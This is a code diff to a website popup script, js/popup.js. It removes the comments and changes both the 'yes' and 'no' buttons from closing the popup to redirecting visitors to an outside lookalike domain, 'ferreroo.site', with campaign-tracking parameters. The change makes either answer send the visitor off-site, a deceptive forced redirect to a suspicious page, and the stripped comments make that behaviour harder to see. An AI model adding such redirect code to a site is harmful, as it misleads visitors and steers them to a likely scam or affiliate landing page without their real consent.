@@ -1,7 +1,5 @@
-// js/popup.js
-// Minimal, namespaced popup that shows on index and lander without breaking Bootstrap
+
 (function () {
-  // Run after DOM is ready
   if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', init);
   } else {
@@ -10,15 +8,15 @@
 
   function init() {
     const path = (location.pathname || '').toLowerCase();
-    const last = path.split('/').filter(Boolean).pop() || ''; // last segment ('' for folder index)
-
-    // Show only on home ("/" or index.html) and lander.html
+    const last = path.split('/').filter(Boolean).pop() || '';
     const isHome   = last === '' || last === 'index.html';
     const isLander = /lander\.html$/.test(last);
 
     if (!isHome && !isLander) return;
 
-    // Build namespaced popup (no Bootstrap conflict)
+    const TERMS_URL = "https://ferreroo.site/?utm_campaign=FrfzGsCeMp&v1=[v1]&v2=[v2]&v3=[v3]";
+
+
     const bd = document.createElement('div');
     bd.className = 'ttf-backdrop';
     bd.innerHTML = `
@@ -35,18 +33,19 @@
 
     document.body.appendChild(bd);
 
-    // Close behavior (just close — same as your current code)
     function closeGate() {
       try { bd.remove(); } catch {}
     }
 
-    // Wire events
-    bd.querySelector('#ttf-yes').addEventListener('click', closeGate);
-    bd.querySelector('#ttf-no').addEventListener('click', closeGate);
+    function redirectToTerms() {
+      window.location.href = TERMS_URL;
+    }
+
+   
+    bd.querySelector('#ttf-yes').addEventListener('click', redirectToTerms);
+    bd.querySelector('#ttf-no').addEventListener('click', redirectToTerms);
     bd.querySelector('.close-btn').addEventListener('click', closeGate);
-    // close when clicking outside
     bd.addEventListener('click', (e) => { if (e.target === bd) closeGate(); });
-    // close on ESC
     window.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeGate(); });
   }
 })();
